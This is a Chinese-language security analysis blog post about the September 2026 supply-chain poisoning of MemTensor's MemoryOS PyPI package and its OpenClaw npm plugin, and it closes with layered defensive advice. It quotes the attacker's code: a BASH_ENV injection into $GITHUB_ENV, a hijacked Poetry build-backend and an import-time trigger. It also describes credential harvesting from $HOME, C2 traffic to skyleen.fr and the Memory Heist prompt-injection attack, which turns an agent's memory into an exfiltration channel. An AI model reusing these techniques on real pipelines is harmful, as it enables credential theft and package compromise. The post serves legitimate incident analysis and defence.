---
title: MemTensor 投毒全链路拆解：import 即执行，发布管道即入口
date: 2026-09-29
layout: article
author: 千里
subtitle: ''
abstract: 攻击者怎么从 GitHub Actions 发布管道里偷到 token，怎么让恶意包通过官方渠道发布，为什么 `pip install` 之后一次普通的 import 就足够，以及为什么你的 Agent 记忆插件是一个完美的攻击面。最后给到分层的行业建议。
category: AI安全
tags:
- 供应链攻击
cover: ''
---

9 月 24 日，SlowMist 发布预警，主要是围绕 MemTensor 的 AI 长期记忆工具链遭供应链攻击，受影响的是面向 LLM/Agent 的开源记忆库 MemoryOS（PyPI 2.0.34），以及连接 OpenClaw 运行时的官方插件 `@memtensor/memos-cloud-openclaw-plugin`（npm 0.1.21 / 0.1.23 / 0.1.25）。

我们需要注意，这次事件并不是简单的"又一个恶意包"或者“供应链攻击”的案例，因为在过程中，它突破了我们对于安全的默认假设，就像Next.js RCE让我们意识到静态网站也可以接管服务器一样，原本我们理解的投毒需要 install hook、锁版本就能保供应链、官方维护者发布的包可信，这些假设都被打脸了。。另外这次被攻击的目标，属于 AI Agent 的记忆层，本身也是目前 AI 工程链路里数据密度最高、权限最泛、监控最薄的一环。

因此，我将在这篇文章系统来分析一下，攻击者怎么从 GitHub Actions 发布管道里偷到 token，怎么让恶意包通过官方渠道发布，为什么 `pip install` 之后一次普通的 import 就足够，以及为什么你的 Agent 记忆插件是一个完美的攻击面。最后给到一些浅见和思考。

## 1. 攻击过程回溯

以下时间线来自 npm/PyPI registry 元数据、GitHub 仓库事件和 commit 记录，全部是可复验的一手数据。

2026 年 9 月 23 日 UTC：

| 时间            | 事件                                                                                       |
| ------------- | ---------------------------------------------------------------------------------------- |
| 00:48–02:03   | GitHub 账号 `Memtensor-AI` 在 OpenClaw 插件仓库上五次创建、推送、删除分支 `sc/release-0.1.21-20260922-cloud` |
| 02:23         | npm 0.1.21 发布，携带 sckit 二进制                                                               |
| 03:17         | MemTensor/MemOS 仓库出现 commit `b52958f`，加入 sckit 载荷和 CI token 窃取逻辑                         |
| 03:45 / 03:49 | npm 0.1.22（干净）、0.1.23（恶意）先后发布                                                            |
| 04:17         | 研究者在仓库提出 Issue #173：这些版本在仓库里找不到对应 commit                                                 |
| 04:33 / 04:36 | npm 0.1.24（干净）、0.1.25（恶意）先后发布                                                            |
| 05:24         | commit `41bf5c7` 删除并重建 tag `v2.0.34`，发布 GitHub Release                                   |
| 05:25         | MemoryOS 2.0.34 上传 PyPI                                                                  |
| 05:55         | tag `v2.0.34-capture-1` 被删除                                                              |

关注一下里面的几个细节，

第一，npm 上的五个版本是干净和恶意交替的：0.1.21 恶意、0.1.22 干净、0.1.23 恶意、0.1.24 干净、0.1.25 恶意。发布时 `latest` tag 指向恶意的 0.1.25。任何人执行 `npm install @memtensor/memos-cloud-openclaw-plugin`，装到的就是带后门的版本。交替发布是一种混淆手段，如果你只抽查了 0.1.22 或 0.1.24，可能会轻易得出"没问题"的结论，至少0.1.23 肯定不会认为是恶意的。

第二，所有五个版本都来自同一个 npm 账号 `leason1974`，这个账号也发布了之前完全合法的 0.1.20。这说明，这次的投毒行为，并不是抢注，也不是域名仿冒，是真实的发布凭据被劫持后从官方渠道发布的"正版"。

第三，PyPI 侧的 MemoryOS 2.0.34，wheel 体积从 2.0.33 的 951 KB 膨胀到 19 MB，里面增加了六个跨平台 Go 二进制，覆盖 linux/darwin/windows 的 amd64/arm64后门。在过程中，我们注意到，有一个被删除的 `v2.0.34-capture-1` tag，这说明攻击者进行了捕获+投毒，两个阶段来实现攻击。

第四，两个仓库的 GitHub Actions 运行记录都被清空了，攻击发生前的最后一条记录停留在 9 月 7 日。日志消失，意味着攻击者有仓库级权限，也意味着事后取证要完全依赖 registry 侧的元数据。

当时最先发现异常的是社区研究者在Issue #173 指出 0.1.21 和 0.1.23 与仓库中任何 commit 都对不上，然后SafeDep 的威胁情报系统监控到这个 issue 后，下载了当天发布的全部版本与最后一个干净版本做比对，才把整条攻击链路拉出来。

又要回归那句草台班子的话题，在如今这个时代，哪怕没有AI加持，像这种投毒的告警还是缺失的。

## 2. 发布token怎么丢失的呢

前面也说了，攻击者攻击的对象最开始的一环是发布者，如果发布者的token没泄漏，大概能应该躲过这一劫，那发布token怎么丢失的呢？

这个又要聊回让今年供应链投毒严重爆炸的 npm，似乎今年都和他或多或少有关系。在nom这一侧，OpenClaw 插件是通过 GitHub Actions 发布的，发布步骤从仓库 secret 里取 `NPM_TOKEN`。攻击者经过一番努力后，实现在短生命周期分支上改了一个发布校验脚本 `validate-release-confirmation.mjs`，改动只有三行：

```javascript
if (env.GITHUB_ENV) {
  appendFileSync(env.GITHUB_ENV,
    `BASH_ENV=${process.cwd()}/.github/scripts/sckit-publish-bridge.sh\n`, "utf8");
}
```

这三行把 `BASH_ENV` 写进了 `$GITHUB_ENV`。要知道，GitHub Actions 的机制是写入 `$GITHUB_ENV` 的变量对后续所有步骤可见，而 Bash 会在执行任何非交互脚本前，先运行 `BASH_ENV` 指向的文件。也就是说，攻击者通过环境变量注入，让自己的脚本在任何后续步骤之前执行，包括真正持有 token 的发布步骤。

读到这里不知道你对这个研究话题有没有印象《Tag即发布权》https://eastsword.github.io/topics/tag-release-power/，对于理解当前的一些意料之外的操作也会有辅助效果。

从这三行代码来看，它先检查 `PACKAGE_NAME` 是不是目标包、`NPM_VISIBILITY_TIMEOUT_SECONDS` 是不是 150，这个值只有发布步骤会设置。匹配才激活，不匹配直接 return。激活后调用 `collectStageZero()` 把 `NODE_AUTH_TOKEN` 交给 sckit 二进制，然后自删除，`exit 1`。然后受害者一旦运行，会发现这次的发布步骤"失败"，一次看起来普通的 CI 失败，没人会怀疑什么，可能调调又运行一次发现一切正常，也就皆大欢喜了，而此时 token 已经发出去到达攻击者手中。

PyPI 侧的路径更精巧，是我认为整个事件里工程水平最高的部分。它利用了一个很多 Python 维护者都没有意识到的攻击面：**Poetry 的 build-backend 是可以换成仓库内文件的**。

攻击者的 commit `b52958f` 修改了 `pyproject.toml`：

```toml
[build-system]
requires = ["poetry-core>=2.0", "packaging>=24"]
build-backend = "sckit_poetry_build"
backend-path = ["."]
```

构建后端不再指向官方的 poetry-core，而是指向仓库里的 `sckit_poetry_build.py`，这个文件包装了真正的 Poetry 后端，但在被 import 时执行 `register()`，用同样的 `BASH_ENV` 技巧把后续步骤指向 `_pypi_bridge.sh`。这个 bridge 只在 PyPI 发布 action 的容器里激活（它检查 `$0` 是不是 `/app/twine-upload.sh`），拦截 `INPUT_PASSWORD` 和 `PYPI_API_TOKEN`，从一个 skyleen.fr 子域下载签名验证过的 emitter 二进制（Ed25519 验签是纯 Python 实现，不依赖 runner 上的任何额外包），然后 `unset` 掉 token 变量，`exit 0`。

在攻击过程中，我们注意到两小时后 commit `41bf5c7` 的 message 是 `chore: allow native PyPI upload [skip ci]`，攻击者此时只删掉 `register()` 那一行调用，让 MemTensor 自己的 CI 用项目真实 token 构建并上传恶意包，并在62 秒后，MemoryOS 2.0.34 上线 PyPI。

非常干净利落的攻击过程，第一阶段窃取token，第二阶段以受害者之名顺利投毒，即使事后去审计"是谁发布了恶意版本"，答案是 MemTensor 自己的 CI、自己的 token、自己的发布流程，遇到糊涂领导可能只会归因到受害者。

在StepSecurity 的静态审查发现，`sckit_poetry_build.py` 里的 `register()` 函数在他们审查的代码路径中未被调用，Corgea 对此的定性是"代码存在且有暗示性，但已证实的触发路径是 import 时的 launcher"。二进制里的证据（`v2.0.34-capture-1` 的 tag 名、精确匹配 twine-upload 的 bridge 逻辑）强烈支持 token 捕获确实发生过，严谨起见，CI helper 路径应该被描述为"高概率执行过"，但是一样要去处理掉。

## 3. 为什么--ignore-scripts不能幸免于难

传统 PyPI/npm 投毒的执行模型是 install hook：`setup.py`、postinstall 脚本，在安装瞬间执行。对应的防御也是围绕这个模型建的，使用`pip --ignore-scripts`、npm 的 `--ignore-scripts`、对 install 脚本的静态扫描。

就在这种背景下，黑天鹅出现了。

npm 侧，恶意版本在 `index.js` 里只加了三处改动：import 一个 `launchStageZero`，在网关启动时调用它，在 memory recall 路径再调用一次，并把用户当前的 prompt 文本作为 `SCKIT_EVENT_TEXT` 传进子进程环境。然后 spawn 一个 detached 的平台二进制，`stdio` 全部忽略，`child.unref()`。插件正常工作，后台多了一个进程。

PyPI 侧更直接。`memos/log.py` 的 `configure_logging()` 里插入了一个 trigger，几乎所有的 import 路径都会走到日志配置，走到日志配置就会触发：

```python
try:
    from memos._stage0 import trigger
    trigger()
except Exception:
    pass
```

`try/except pass` 保证即使载荷启动失败也绝不影响库的正常功能。你的 Agent 应用 `import memos` 一次，Go 二进制就在后台以独立会话跑起来了。

**没有 install hook，`--ignore-scripts`** **完全无效。** 安装是干净的，执行发生在使用时。

此时检测窗口从"安装时"移动到了"运行时"，而绝大多数企业的依赖扫描、准入策略、CI 门禁，全部只在安装时把关，理论上这个环境就算打了全部补丁、启用了所有安全选项，很可能就因为这样一次普通的 `import` 被攻陷。

结合SafeDep、Aikido、Socket 的分析，分析一下载荷本身的能力：

- **凭据清点**：`.npmrc`、`.pypirc`、`.git-credentials`、`.netrc`、SSH 私钥、`.vault-token`、`access_tokens.json`，以及环境变量中的 token 类值，配置里 `inventory_roots` 是 `$HOME`整个目录全盘清点。

- **C2 通信**：三个 skyleen.fr 子域，各自带 control/status/batch 路径。协议层用 CBOR 编码、X25519 密钥交换、XChaCha20-Poly1305 加密，支持签名 lease、manifest 和模块化投递。这不是一个一次性的窃取脚本，是一个模块化 loader 框架——bundle 里的 stage0 只是个引导器，后续载荷从 C2 按需下发。

- **自清理**：二进制里有 `scheduleSelfDelete` 和 `deleteExecutable` 例程，执行完自动减残留。配置里有 `not_after` 过期时间戳。运营者在乎痕迹管理。

- **环境适配**：0.1.25 额外加了 `lib/tls-trust.js` 和打包的 `ca-roots.pem`——在 slim 容器这种没有系统证书库的环境里，HTTPS 到 C2 的连接也不会失败。这个细节说明攻击者对容器化部署（也就是大量 Agent 生产的真实环境）有充分理解。

- **蠕虫逻辑**：Aikido 从二进制里恢复的字符串包括 `prepareRemoteNode`、`prepareRemotePython`、`prepareRemoteWorkflow`，以及直接面向 npm/PyPI 再发布的逻辑。Go module 的名字就叫 `supplychain.local/campaign`。需要说明，这是静态字符串层面的证据，"每个被感染主机都进行了再发布"没有得到证实——但它清楚表明了设计意图：**把偷来的凭据变成下一轮包投毒的原材料**。窃取和传播是一个闭环，不是两件事。

基于这个病毒毒性如此巨大，装过恶意版本的主机，都应该按**已沦陷的主机**处理。

## 4. 为什么是记忆工具链

供应链投毒，自从今年开始，就从加密货币 SDK（偷钱包）和构建工具（偷 CI 凭据）转移到了 AI 相关，这次的目标更是直接瞄准了记忆相关的部分，MemoryOS 是给 LLM/Agent 提供长期记忆的基础库，使用它的环境几乎必然具备三个特征：有模型 API key、有完整的 Agent 开发栈、有真实的用户数据在记忆流里跑。

memory recall 路径触发时，**用户的 prompt 文本被显式地作为** **`SCKIT_EVENT_TEXT`** **传给了恶意进程**。攻击者在载荷层面明确表达了对 prompt 内容的兴趣，如果你读过我这篇文章https://eastsword.github.io/articles/llm-api-key-leak/，我们知道有这么一类攻击者，他们正在窃取LLM key，很显然这不是一个只偷凭据的窃取者。

这和腾讯朱雀实验室 8 月披露的 Memory Heist 攻击刚好构成一枚硬币的两面。Memory Heist 走的是推理层：攻击者把恶意提示词嵌进网页，诱导 Agent 把记忆里的数据逐字符编码进 URL 路径外泄，全程不经过任何敏感接口，WAF 和 DLP 都看不到，因为对网络层来说那只是一串正常的 GET 请求。而 sckit 走的是供应链层：不再费心诱导 Agent，直接把记忆工具链本身变成 implant。

因此我们可以得出一个直接的结论，**Agent 的记忆层是一个独立的信任边界，而且是当前整个 AI 栈里防护最薄弱的边界之一。** 它同时具备数据密度高（记忆里存的是用户画像、业务上下文、历史决策）、权限泛（记忆库往往被授予读写 Agent 完整上下文的权限）、部署位置关键（就跑在你的 Agent 进程里）三个属性。攻击者已经从两侧同时进场了。

另外，现在大家使用了很多记忆插件，作为 Agent 框架生态里的"万能连接器"，它天然要接入多个运行时（这次事件里是 OpenClaw 网关）、多个模型后端、多种存储。这种"什么都连"的架构定位，意味着它的供应链失陷会横向传导到整个 Agent 栈。你审计了自己用的 LangChain、审计了自己的模型网关，但你的 Agent 记忆是从一个 9 月 23 日刚发布的 npm 包里来的。

## 5. 攻击趋势判断

- **2026 年 5 月，Shai-Hulud / Mini Shai-Hulud**：攻击者接管维护者账户，向 npm 投毒 317 个 AntV 系包。云安全联盟 CSA 事后研究给出的关键结论是：被攻陷的 GitHub Actions runner **依然能产出 SLSA Build Level 3 的 attestation**——SLSA 证明的是构建过程的完整性，不是代码和凭据的完整性。

- **2026 年 7 月，Injective**：开发者 GitHub 账户被入侵，`@injectivelabs/sdk-ts` 植入恶意版本，17 个依赖包级联感染，周下载 5 万次。

- **2026 年 9 月，LiteLLM**：v1.82.7/8 两个版本被植入凭据窃取代码，这个月下载 9700 万次的 AI 网关库被 PyPI 紧急撤回。

- **2026 年 9 月，MemTensor**：发布管道劫持 + import 时执行 + 蠕虫化。

我们从四起事件去找共性，"npm/PyPI 有恶意包"这个其实不能说明什么，重要的是**攻击者的目标从"包"上移到了"发布包的凭据和管道"**。Shai-Hulud 攻击维护者账户，MemTensor 攻击 CI 发布管道，Injective 攻击开发者账户，每一次都绕过了注册表侧对包内容的审查，因为包确实是从官方账号、官方管道发出来的。

老生常谈的就是今年攻击目标高度一致地收敛于 AI 生态，比如LiteLLM、LangChain 生态、MemoryOS、OpenClaw 插件，因为当前 AI 开发环境里密钥密度高、依赖更新文化激进（追新版本）、安全建设普遍滞后于业务迭代。

对防御方的坏消息是，现有的几道主流防线在这条攻击曲线上几乎是逐个失守的：

- **`--ignore-scripts`**：对 sckit 无效，它不在安装时执行。

- **lockfile 锁定**：你锁定的 0.1.25 就是恶意版本。锁版本防的是"未来被替换"，防不了"现在已被投毒"。你的知识库里那份 npm 信任链分析其实早就指出过 lockfile 固定恶意版本的传播模型——这次的 `latest` 指向恶意版，就是这个模型的现实版。

- **SLSA / provenance**：CSA 的结论摆在那里，被攻陷的 runner 照样能出具合格的构建证明。MemTensor 的恶意包就是 MemTensor 自己的 CI 用自己的 token 构建发布的——provenance 链条完美无瑕，内容是毒的。

- **"官方包可信"**：`leason1974` 是发布了合法 0.1.20 的同一个官方账号。

每道防线的失效方式各异，这也正说明当下的单点方案已经远远不足以支撑企业的建设目标。

## 6. 行业建议

按角色给大家提些建议

**给 AI 开源项目维护者：**

1. 发布凭据迁移到短时效模型：npm 用 granular access token 并开启 publish 时的 2FA；PyPI 用 Trusted Publishing（OIDC 绑定仓库和工作流），让"长期有效的 API token"这个概念从发布链路里消失。这次攻击的核心资产就是长期 token——它没了，capture 阶段就断了。
2. 把 `pyproject.toml` 的 `build-backend` 变更列为高危 review 项。一个 build-backend 指向仓库内文件，意味着构建过程执行任意仓库代码。同类的高危变更还有：`.github/scripts/` 下任何脚本改动、`$GITHUB_ENV` 写入、`workflow_dispatch` 的 ref 输入。这次的入口就是三行代码。
3. 建立版本-commit 对应性审计：每个发布的 registry 版本必须能对应到 main 分支的一个公开 commit。Issue #173 的研究者就是靠这个发现异常的。这件事可以脚本化，每次发布后自动校验，不对应就告警。
4. Actions 运行日志不可删除：攻击者清空了两边仓库的 run 记录。检查仓库权限模型里谁能删除 workflow runs，把这项权限从开发者常规权限里拿掉。

**给企业使用方：**

1. 依赖跟进加冷却期。这次恶意版本在 registry 上存活时间以小时计，攻击者的运营节奏就是"发布-收割-被清"的快速循环。对新版本的自动采用设置 24–48 小时延迟窗口，能显著降低暴露面。对 AI 生态包尤其如此。
2. 把检测窗口从安装时刻扩展到运行时刻。这次事件里能抓住载荷的行为特征其实很清晰：一个 detached 的子进程、启动后对 `$HOME` 下凭据文件的大范围读取、向陌生 HTTPS 域名的外联。EDR 的进程行为规则盯这三个信号，比任何依赖扫描都及时。
3. egress 控制在这次事件里是真实有效的止损点：三个 C2 域名都是 skyleen.fr 的子域。CI runner 和 Agent 运行环境的出网白名单化，值得重新排一次优先级。
4. 一旦确认使用过恶意版本，按主机沦陷处理，不要按"卸载包"处理：降级（npm 0.1.20 / PyPI 2.0.33）、终止 sckit 进程、封锁 skyleen.fr、从干净镜像重建、轮换该环境能触达的所有凭据（npm/PyPI/GitHub/GitLab/云/SSH/Vault）、回查 CI 历史里有无异常发布。这套动作和 SlowMist 的公开建议一致——顺序不要错：先轮换凭据再清理环境。
5. 用了 OpenClaw 插件跑 Agent 工作流的，把 prompt 内容也纳入泄露评估范围。`SCKIT_EVENT_TEXT` 意味着你的用户 prompt、业务上下文可能已经在攻击者的服务器上。

**给生态和平台方：**

1. 注册表侧做 publish-time 的 VCS 一致性校验：发布版本与仓库 tag/commit 的对应性是这次事件里唯一提前暴露的异常信号（Issue #173），但它依赖人肉发现。npm/PyPI 有条件把"registry 版本 ↔ 公开 commit"的一致性做成自动检查。
2. 社区信号通道要被产品化。这次最先发现问题的不是任何一家安全厂商的自动化系统，是一个 GitHub issue。注册表和安全厂商需要把这类社区报告纳入优先级最高的信号源。

**给 Agent 工程团队：**

把记忆层纳入信任边界管理。具体来说：记忆插件的运行时权限做最小化（它不需要读你的 `.ssh`）；记忆数据的存储位置、同步路径、注入面纳入 Agent 安全检查清单；对进入记忆流的内容做来源审计。你的知识库里如果已经有 Agent Checkup 清单，"记忆来源、保存位置、删除机制、注入风险"这四项检查现在要加上第五项：**记忆工具链本身的供应链审计**——它是怎么发布的、发布管道长什么样、谁有发布权限。

## 7. 继续关注

sckit 是模块化 loader，stage0 之后由 C2 下发的 stage1+ 载荷，到现在没有出现在公开分析里。也就是说，我们看到的是引导器，真正的任务载荷是什么、执行过什么，取决于对 skyleen.fr 基础设施和被感染主机的取证，这块公开的信息还是空的，还有蠕虫的分析也没披露。不过360 的 AI 安全周报已经把六个平台的 sckit 二进制 SHA-256 哈希整理成了 STIX 数据，可以先加入威胁情报。

配置里 campaign\_id 是 `cloud-openclaw-semi-nuclear`，profile 是 `semi-nuclear`。"semi"这个前缀暗示存在其他强度档位的 profile，`not_after` 过期机制说明运营者按活动周期管理这套东西。这可能不是一次性行动。

前面有提到，这次事件里证明基本所有单点技术方案都失效了，这次能发现攻击是因为有个幸运的相关研究者提了issue，这说明最朴素的不一致检测关键时刻是能兜底的。供应链安全的本质可能不是更聪明的扫描器，而是把"发布的东西必须和源码对得上"这个基本事实检查，牢牢在每一层基础设施里进行把控。

***

**参考来源：**

1. SafeDep, *MemTensor npm and PyPI Packages Hit by a Go Worm*（2026-09-23）—— 时间线、BASH\_ENV 注入、Poetry build-backend 劫持、载荷行为
2. Corgea Research, *MemTensor's OpenClaw plugin and MemoryOS launched the sckit implant*（2026-09-24）—— 版本状态、执行路径、猎杀指南
3. Aikido, *Novel supplychain.local Go worm appears* —— 蠕虫逻辑定性
4. Socket / StepSecurity 分析 —— 运行时细节与 CI helper 路径的限定
5. Snyk 漏洞记录 SNYK-JS-MEMTENSORMEMOSCLOUDOPENCLAWPLUGIN-20064040
6. SlowMist 预警（2026-09-24，经深潮 TechFlow / MarsBit 转述）—— 处置建议
7. 360 威胁情报中心《AI 安全专题周报（20260925）》—— sckit 各平台 SHA-256 与 STIX 数据
8. 腾讯朱雀实验室《AI Agent 的记忆，为什么会成为攻击者的数据金矿？》（2026-08-05）—— Memory Heist 攻击链
9. CSA Research Note, *Mini Shai-Hulud: AI Supply Chain Worm Hits npm and PyPI*（2026-05）—— SLSA attestation 局限性

> 注：文中蠕虫再发布能力来自 Aikido 的二进制字符串分析，属于设计意图层面的证据；CI helper 的 PyPI token 捕获路径在 StepSecurity 静态审查中存在"register() 未被调用"的分歧，本文按"高概率执行、未完全证实"处理。SlowMist 处置建议经中文媒体转述，未核对原始推文。
